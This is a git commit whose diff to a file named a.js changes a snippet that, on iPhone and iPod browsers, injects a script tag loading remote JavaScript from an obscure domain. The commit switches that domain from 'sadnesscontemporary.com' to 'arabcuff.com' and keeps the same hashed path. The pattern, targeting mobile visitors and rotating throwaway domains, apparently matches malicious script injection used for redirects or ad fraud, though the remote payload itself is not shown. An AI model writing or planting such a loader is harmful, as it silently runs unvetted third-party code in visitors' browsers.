e04f4782ee75aa6bd1619299b1865b356f1e7c1d
dork12 <127926288+yukrini@users.noreply.github.com>
2024-02-18 09:24:02 +0700

    Update a.js

--- a.js
+++ a.js
@@ -4,7 +4,7 @@
  navigator.userAgent.match(/iPhone/i) ||
  navigator.userAgent.match(/iPod/i)){
 	 
-	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//sadnesscontemporary.com/b5/13/86/b513868d33b5b1194392b4fd19a3dc2a.js',document.body||document.documentElement)
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//arabcuff.com/b5/13/86/b513868d33b5b1194392b4fd19a3dc2a.js',document.body||document.documentElement)
 	 }
 	 
 	
